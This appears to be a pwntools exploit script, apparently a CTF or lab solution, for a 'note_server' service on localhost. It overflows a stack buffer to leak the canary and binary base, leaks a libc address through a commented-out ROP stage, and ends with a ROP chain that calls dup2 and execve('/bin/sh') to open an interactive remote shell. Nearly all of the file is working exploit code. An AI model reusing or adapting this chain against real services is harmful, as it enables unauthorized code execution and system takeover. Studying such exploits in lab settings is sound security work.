from pwn import *
from concurrent import futures
from base64 import b64encode,b64decode
from time import sleep

RHOST = '127.0.0.1'
RPORT = '1339'
context.arch = 'amd64'
context.os = 'linux'

buffer_filler = b'\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
smash_cpy = b'\x02\x00\x00\xff'
legal_cpy = b'\x02\x00\x04\xff'
read = b'\x03'
fill = b'\x01\x04\xde\xad\xbe\xef'
bin_offset = 0x1674

def flip_endian(word):
    word = int(word,16) # ret is a le hex string
    word = p64(word) # flips endian of a string
    word = word.hex() # be
    return word

def deliver_payload(payload):
    r.send(payload)
    return r.recv().hex()

################################################################################
# CANARY
################################################################################
r=remote(RHOST,RPORT)
payload = buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += legal_cpy
payload += read

raw = deliver_payload(payload)

EOB=1024*2
trash = raw[EOB:EOB+16]
canary = raw[EOB+16:EOB+32]
ebp = raw[EOB+32:EOB+48]
ret = raw[EOB+48:EOB+64]

base_addr = flip_endian(ret)
base_addr = int(base_addr,16) - bin_offset
base_addr = hex(base_addr) 
base_big_string = base_addr
print(flip_endian(trash))
print(flip_endian(canary))
print(flip_endian(ebp))
print(flip_endian(ret))
r.close()


################################################################################
# SMASH THROUGH CANARY
################################################################################
canary = 0x529adcce455f9300
b_canary = p64(canary)

base = 0x0000562a92d57f54
################################################################################
'''
BASE + FD3                
4000000000000000          
BASE + FD1                
BASE + 201f88             
12345678                  
BASE + 900                

'''
'''
# --- leak libc
canary = 0x529adcce455f9300
b_canary = p64(canary)

base = 0x0000562a92d57f54
#b_base = p64(base-0x1674).decode('latin-1') # local
b_base = p64(base-0xf54).decode('latin-1') # remote
################################################################################
bin_base = u64(b_base)

elf  = ELF("/home/kali/Desktop/note_server",checksec=False)
#elf  = ELF("./note_server",checksec=False)
elf.address = bin_base
rop = ROP(elf)

rop.write(0x4,elf.got['write'])
r=remote(RHOST,RPORT)
chain = rop.chain()

pad = b'b'*183
payload = b'\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00' + b_canary + b'\x00\x00\x00\x00\x00\x00\x00\x00' + chain
payload += pad
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += smash_cpy
payload += read
print(deliver_payload(payload))
'''

################################################################################
# --- shell me
################################################################################
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so",checksec=False)
libc  = ELF("/home/kali/libc6_2.27-3ubuntu1_amd64.so",checksec=False)
write = 0x7ff75c036140
libc.address = write - libc.symbols['write']
rop_libc = ROP(libc)
binsh = next(libc.search("/bin/sh\x00".encode()))

r=remote(RHOST,RPORT)
rop_libc.dup2(0x04,0x00)
rop_libc.dup2(0x04,0x01)
rop_libc.execve(binsh,0x00,0x00)
chain = rop_libc.chain()
#print(len(chain)) # 136
#print(len(chain)) # 128

pad = b'b'*103
payload = b'\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00' + b_canary + b'\x00\x00\x00\x00\x00\x00\x00\x00' + chain
payload += pad
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += smash_cpy
payload += read
r.send(payload)
r.interactive()
